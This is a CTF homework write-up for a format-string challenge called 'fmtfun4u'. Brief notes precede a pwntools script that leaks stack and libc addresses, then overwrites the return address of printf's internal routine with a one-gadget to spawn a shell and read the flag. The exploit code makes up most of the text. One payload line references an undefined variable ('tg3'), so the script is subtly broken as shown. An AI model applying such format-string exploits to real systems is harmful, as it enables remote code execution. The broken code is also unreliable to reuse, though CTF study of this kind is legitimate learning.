# HW4
## fmtfun4u 150
* First time `fmt` to leak `stack` and `libc`.
* `Fmt` to using `arg11` modify the first two significant byte of the pointer which `arg11` point to.
* `[arg11]` -> `stack address store return address of _IO_vfprintf_internal`.
* Choosing this return address due to we only need to modify two byte of it.
* old -> `libc + 0x4fef1` , mod -> `libc + 0x4526a`.
* Third `fmt` is to modify return address of `vfprint` to `one`.
* Got the shell.

```python
#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{FEED_MY_TURTLE}

context.arch = 'amd64'

e , l = ELF('./fmtfun4u') , ELF('./libc.so.6')

host , port = 'csie.ctf.tw' , 10136

y = remote(host,port)
#y = process( './fmtfun4u' , env = {'LD_PRELOAD':'./libc.so.6'} )
#print util.proc.pidof(y)
#raw_input('>')

'''
6 -> cal
11 -> jmp
37 -> target

base: 0x7ffff7a0d000
0x7ffff7a5a4a6 0x4d4a6
return address of _IO_vfprintf_internal is 0x7ffff7a5cef1 <vfprint>
0x7ffff7a5cef1 0x4fef1
one            0x4526a
'''

p = '%6$p.%10$p.%9$p.' #leak
y.sendafter( ':' , p )

y.recvuntil('0x')
stk = int( y.recvuntil('.')[:-1] , 16 )
y.recvuntil('0x')
stk2 = int( y.recvuntil('.')[:-1] , 16 )
y.recvuntil('0x')
l.address += int( y.recvuntil('.')[:-1] , 16 ) - 0x20830

tg = stk - 0x28a8
magic = 0x4526a

log.success( 'stack ->   {}'.format( hex( stk ) ) )
log.success( 'Target -> {}'.format( hex( tg ) ) )
log.success( 'Target_mod -> {}'.format( hex( tg & 0xffff ) ) )
log.success( 'libc -> {}'.format( hex( l.address ) ) )
log.success( 'one -> {}'.format( hex( l.address + magic ) ) )

p = '%.{}x%11$hn\x00'.format( str( tg3 & 0xffff ) ) # use pointer1 mod pointer2
print p
y.sendlineafter( ':' , p )
sleep(1)

p = '%.{}x%37$hn\x00'.format( str( (l.address + magic) & 0xffff ) ) # use pointer2 mod return address in libc -> one
print len(p)
y.send( p )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()
```